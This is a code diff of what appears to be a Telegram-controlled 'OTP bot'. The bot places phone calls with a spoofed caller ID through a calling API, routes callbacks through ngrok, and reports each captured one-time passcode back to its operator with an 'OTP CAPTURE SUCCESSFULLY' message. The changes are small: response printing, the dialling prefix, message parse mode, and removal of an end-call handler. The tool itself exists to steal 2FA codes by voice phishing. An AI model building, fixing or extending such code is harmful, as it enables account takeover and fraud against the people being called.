@@ -833,7 +833,7 @@ def callhangupmanual(message):
     "apikey":f"{apiKey2}"
 }
          resp=requests.post(urlht, json=data)
-         print(resp)
+         print(resp.text)
     c.close()
 
 
@@ -863,7 +863,7 @@ def callhangup(chatid:int):
     "apikey":f"{apiKey2}"
 }
          resp = requests.post(urlht, json=data)
-         print(resp)
+         print(resp.text)
     c.close()
 
 
@@ -911,7 +911,7 @@ def callmaking(number,spoof,chatid,service,amd):
                     data = {
 
   "apikey": f"{apiKey2}",
-  "to":f"024{number}",
+  "to":f"{apidata[2]}{number}",
   "from":f"{spoof}",
   "callback":f"{ngrok_url}/{service}/{chatid}/random/texis",
   "enable": "8881"
@@ -965,7 +965,7 @@ def custom_callmaking(number,spoof,chatid,script_id,amd):
                     data = {
 
   "apikey": f"{apiKey2}",
-  "to":f"024{number}",
+  "to":f"{apidata[2]}{number}",
   "from":f"+{spoof}",
   "callback":f"{ngrok_url}/{script_id}/{chatid}/custom/texis",
   "enable": "8881"
@@ -1198,7 +1198,7 @@ def custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp=otp2)
-            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 <code>{otp2}</code> ✅*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 <code>{otp2}</code> ✅*""",parse_mode='HTML')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1386,7 +1386,7 @@ def prebuild_script_call(service,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp2)
-            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 <code>{otp2}</code> ✅*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 <code>{otp2}</code> ✅*""",parse_mode='HTML')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1575,7 +1575,7 @@ def t_custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp=otp2)
-            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 <code>{otp2}</code> ✅*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 <code>{otp2}</code> ✅*""",parse_mode='HTML')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1894,8 +1894,6 @@ def handle_callback(message):
        Price_list(message)
     elif message.data == '/customscript':
         Set_custom(message)
-    elif message.data == '/endcall':
-        callhangupmanual(message)
     elif message.data == '/voice':
         Voices(message)
     elif message.data == '/help':
